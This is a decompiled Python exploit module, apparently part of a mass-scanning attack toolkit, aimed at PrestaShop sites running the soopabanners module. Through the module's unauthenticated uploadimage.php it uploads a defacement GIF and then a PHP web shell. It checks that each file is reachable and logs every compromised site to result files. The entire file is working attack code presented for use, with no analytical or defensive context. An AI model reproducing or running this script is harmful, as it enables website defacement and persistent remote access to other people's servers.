# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\Presta_soopabanners.py
import requests
from Exploits import printModule
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
Jce_Deface_image = 'files/pwn.gif'
ShellPresta = 'files/up.php'

def Exploit(site):
    try:
        Exp = site + '/modules/soopabanners/uploadimage.php'
        FileDataIndex = {'userfile': open(Jce_Deface_image, 'rb')}
        FileDataShell = {'userfile': open(ShellPresta, 'rb')}
        GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=10, headers=Headers)
        if 'success' in GoT.content:
            IndexPath = '/modules/soopabanners/slides/' + Jce_Deface_image.split('/')[1]
            CheckIndex = requests.get('http://' + site + IndexPath, timeout=10, headers=Headers)
            if 'GIF89a' in CheckIndex.content:
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(IndexPath + '\n')
                requests.post('http://' + Exp, files=FileDataShell, timeout=10, headers=Headers)
                ShellPath = '/modules/soopabanners/slides/' + ShellPresta.split('/')[1]
                CheckShell = requests.get('http://' + site + ShellPath, timeout=10, headers=Headers)
                if 'Vuln!!' in CheckShell.content:
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(ShellPath + '\n')
                return printModule.returnYes(site, 'N/A', 'soopabanners Module', 'Prestashop')
            else:
                return printModule.returnNo(site, 'N/A', 'soopabanners Module', 'Prestashop')

        else:
            return printModule.returnNo(site, 'N/A', 'soopabanners Module', 'Prestashop')
    except:
        return printModule.returnNo(site, 'N/A', 'soopabanners Module', 'Prestashop')